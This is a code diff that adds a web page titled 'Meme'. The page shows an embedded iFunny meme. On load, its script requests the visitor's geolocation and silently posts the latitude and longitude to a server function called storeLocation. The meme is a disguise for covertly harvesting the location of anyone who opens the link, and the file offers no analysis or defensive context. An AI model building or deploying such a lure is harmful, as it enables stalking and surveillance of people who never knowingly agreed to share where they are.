@@ -1,0 +1,37 @@
+<!-- locate.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Meme</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            sendLocation(latitude, longitude);
+        }
+
+        function sendLocation(latitude, longitude) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "/.netlify/functions/storeLocation", true);
+            xhttp.setRequestHeader("Content-Type", "application/json");
+            xhttp.send(JSON.stringify({ latitude: latitude, longitude: longitude }));
+        }
+
+        window.onload = function() {
+            getLocation();
+        };
+    </script>
+</head>
+<body>
+    <!-- iframe with the meme link -->
+    <iframe src="https://ifunny.co/picture/sekiro-critical-a-swift-and-brutal-sword-stab-to-finish-jMAKPfFV8?s=cl" width="500" height="400"></iframe>
+</body>
+</html>
